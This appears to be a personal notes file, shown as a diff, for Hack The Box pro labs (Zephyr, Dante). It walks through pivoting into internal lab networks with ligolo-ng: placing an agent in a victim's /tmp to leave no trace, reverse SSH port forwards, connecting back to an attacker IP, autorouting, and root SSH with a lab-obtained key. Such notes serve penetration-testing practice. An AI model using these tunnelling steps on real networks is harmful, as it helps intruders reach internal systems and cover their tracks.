@@ -1,0 +1,183 @@
+WORKING stuff for zephyr>
+
+0. 10.10.110.35 painters.htb
+add this to /etc/hosts
+
+
+1. check for any created interfaces (should only have tun0, lo, eth0):
+
+ip a
+
+2. if there are interfaces created earlier, delete them as such:
+
+sudo ip link set evil-cha down
+
+sudo ip tuntap del mode tun dev evil-cha
+
+
+3. on attacker cd into home and download ligolo PROXY (attacker):
+
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+
+unzip ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+
+tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+
+./proxy -selfcert 
+
+
+
+4. on attacker cd into home and download ligolo Agent and place on victim host machine in temp so that we dont leave anything after reboot:
+
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+
+tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+
+scp ./agent riley@painters.htb:/tmp/agent
+
+
+
+5. create a new fresh interface:
+
+ligolo-ng>> interface_create --name ligolo
+
+
+6. print fingerprint to be used later on victim to connect:
+
+ligolo-ng>> certificate_fingerprint
+
+
+7. (optional) sometimes the port on the victim may be closed, so we may need to open it up (bind it). On the victim do:
+
+ssh daniel@painter.htb -R 11601:127.0.0.1:11601 -N
+
+
+8. on victim establish connection using the method above
+
+./agent -connect 127.0.0.1:11601 -accept-fingerprint 5E18A524D726377FA2A394FB3A49C0D6D7987E4CC4CB9FD0BA9777FE7F7227E0
+
+
+9. on victim establish connection using general method using attackers ip
+
+/agent -connect 10.10.17.249:11601 -accept-fingerprint 5E18A524D726377FA2A394FB3A49C0D6D7987E4CC4CB9FD0BA9777FE7F7227E0
+
+
+10. back on the attacker machine we should get a connection. Do:
+ligolo-ng>> session
+
+ligolo-ng>> 1             #select a session number
+
+Agent  :  riley@mail>> autoroute
+
+have to use right arrow to select all and click enter
+
+might ask for what interface to use, select ligolo using arrow keys
+
+Start the tunnel? (y/N): y
+
+
+
+11. tada should work. if not, and an error such as "unable to start tunnel: file exists", do:
+
+
+
+[Agent : riley@mail]>> show_interface     #note down the ligolo routing used for example 192.168.110.51/24
+
+
+[Agent : riley@mail]>> interface_delete --name ligolo
+
+
+[Agent : riley@mail]>> interface_create --name ligolo
+
+
+./agent -connect 127.0.0.1:11601 -accept-fingerprint 5E18A524D726377FA2A394FB3A49C0D6D7987E4CC4CB9FD0BA9777FE7F7227E0
+
+now we should get a connecting message back on attackers ligolo, press enter
+
+ligolo-ng>> session
+
+ligolo-ng>> 1
+
+ligolo-ng>> autoroute
+
+have to use right arrow to select all and click enter
+
+might ask for what interface to use, select ligolo using arrow keys
+
+Start the tunnel? (y/N): y
+
+tada
+
+may need to remove the yaml file in same dir
+
+-------------------------------------------------------------------
+
+obtained ssh key from Kilroy
+
+
+ssh -i /home/spectre/Desktop/vpn/private_key root@10.10.110.100
+
+get the agent on the machine go to github
+
+
+
+(on attacking machine)
+
+mkdir dante
+
+mv Downloads/ligo-ng_proxy_0.8.2_linux_amd64.tar.gz dante
+
+cd dante
+
+tar -xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+
+rm ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+//made mistake here?
+
+cp ~/Downloads/ligo-ng_proxy_0.8.2_linux_amd64.tar.gz .
+
+tar -xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+
+rm LICENSE README.md
+
+chmod +x proxy
+
+./proxy -autocert
+
+sudo ./proxy -autocert
+
+sudo ./proxy -selfcert
+
+
+
+
+
+
+
+
+tmux
+
+
+
+./proxy
+
+
+
+
+ctrl+b?
+
+ctrl+b arrow keys
+
+certificate_fingerprint
+
+create_interface --name "NIX01"
+
+interface_create --name "NIX01"
+
+session
+
+tunnel_start --tun NIX01
+
+ifconfig
+
+interface_add_route --name NIX01 --route 172.16.1.0/24
